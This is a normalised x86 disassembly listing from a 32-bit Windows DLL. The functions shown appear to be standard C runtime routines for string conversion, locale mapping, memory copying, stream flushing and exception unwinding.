call sub_100031b5
push [ esi + 0x68 ]
call sub_100031b5
push [ esi + 0x6c ]
call sub_100031b5
push [ esi + 0x70 ]
call sub_100031b5
push [ esi + 0x74 ]
call sub_100031b5
push [ esi + 0x78 ]
call sub_100031b5
push [ esi + 0x7c ]
call sub_100031b5
add esp 0x40
push [ esi + 0x80 ]
call sub_100031b5
push [ esi + 0x84 ]
call sub_100031b5
push [ esi + 0x88 ]
call sub_100031b5
push [ esi + 0x8c ]
call sub_100031b5
push [ esi + 0x90 ]
call sub_100031b5
push [ esi + 0x94 ]
call sub_100031b5
push [ esi + 0x98 ]
call sub_100031b5
push [ esi + 0x9c ]
call sub_100031b5
push [ esi + 0xa0 ]
call sub_100031b5
push [ esi + 0xa4 ]
call sub_100031b5
push [ esi + 0xa8 ]
call sub_100031b5
push [ esi + 0xb8 ]
call sub_100031b5
push [ esi + 0xbc ]
call sub_100031b5
push [ esi + 0xc0 ]
call sub_100031b5
push [ esi + 0xc4 ]
call sub_100031b5
push [ esi + 0xc8 ]
call sub_100031b5
add esp 0x40
push [ esi + 0xcc ]
call sub_100031b5
push [ esi + 0xb4 ]
call sub_100031b5
push [ esi + 0xd4 ]
call sub_100031b5
push [ esi + 0xd8 ]
call sub_100031b5
push [ esi + 0xdc ]
call sub_100031b5
push [ esi + 0xe0 ]
call sub_100031b5
push [ esi + 0xe4 ]
call sub_100031b5
push [ esi + 0xe8 ]
call sub_100031b5
push [ esi + 0xd0 ]
call sub_100031b5
push [ esi + 0xec ]
call sub_100031b5
push [ esi + 0xf0 ]
call sub_100031b5
push [ esi + 0xf4 ]
call sub_100031b5
push [ esi + 0xf8 ]
call sub_100031b5
push [ esi + 0xfc ]
call sub_100031b5
push [ esi + 0x100 ]
call sub_100031b5
push [ esi + 0x104 ]
call sub_100031b5
add esp 0x40
push [ esi + 0x108 ]
call sub_100031b5
push [ esi + 0x10c ]
call sub_100031b5
push [ esi + 0x110 ]
call sub_100031b5
push [ esi + 0x114 ]
call sub_100031b5
push [ esi + 0x118 ]
call sub_100031b5
push [ esi + 0x11c ]
call sub_100031b5
push [ esi + 0x120 ]
call sub_100031b5
push [ esi + 0x124 ]
call sub_100031b5
push [ esi + 0x128 ]
call sub_100031b5
push [ esi + 0x12c ]
call sub_100031b5
push [ esi + 0x130 ]
call sub_100031b5
push [ esi + 0x134 ]
call sub_100031b5
push [ esi + 0x138 ]
call sub_100031b5
push [ esi + 0x13c ]
call sub_100031b5
push [ esi + 0x140 ]
call sub_100031b5
push [ esi + 0x144 ]
call sub_100031b5
add esp 0x40
push [ esi + 0x148 ]
call sub_100031b5
push [ esi + 0x14c ]
call sub_100031b5
push [ esi + 0x150 ]
call sub_100031b5
push [ esi + 0x154 ]
call sub_100031b5
push [ esi + 0x158 ]
call sub_100031b5
push [ esi + 0x15c ]
call sub_100031b5
push [ esi + 0x160 ]
call sub_100031b5
add esp 0x1c
sub_10007423
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002b9f
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_10007650
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007e5c
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_100031ed
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_10008590
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007e5c
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007e5c
add esp 0x18
jmp r-xdata
push esi
call sub_10007650
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_100031ed
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10008590
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_1000760c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10003636
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10007423
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10007650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_100031b5
pop ecx
sub_1000766e
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002b9f
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_10006eb0
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_10007650
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_100031ed
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10008590
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_1000775a
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10003636
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000766e
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100077a0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_10007c74 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10007b78 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c74 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_100079ec ]
jmp [ ecx * 4 + jump_table_10007a6c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007ad8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007c74 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007ad8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c74 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c74 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c74 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007ad8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007ad8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007ad8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_10007ad8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_10007de4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_10007ea8
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10007e32
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_10007de4
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_10007e5c
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007e32
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10007ea8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_10007f16
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
or eax 0xffffffff
pop ebp
retn
sub_10007f50
call sub_10006469
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10006492
pop ecx
push 0x3
call sub_10003d85
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_100052fd
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_10007f93
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
or eax 0xffffffff
pop ebp
retn
sub_10007fb7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_10004d21
mov [ eax ] 0x9
jmp r-xdata
call sub_10004d21
mov [ eax ] 0x9
call sub_10005458
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1000800b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10008051
pop ecx
test eax eax
je r-xdata
push esi
call sub_100080be
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10007f93
push eax
call sub_100085bc
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10008051
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_10007f93
pop ecx
push eax
call sub_100086a2
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100080be
push 0x14
push r--data
call sub_10004af0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008199
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_10004b35
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100068bb
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10008166
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_1000800b
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_1000800b
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_100081b0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100081d0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10002b9f
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10008215
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10008215
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_100081d0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100082c5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100082e4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_100082c5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_100082e7
push 0x10
push r--data
call sub_10004af0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000837b
mov eax edi
call sub_10004b35
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
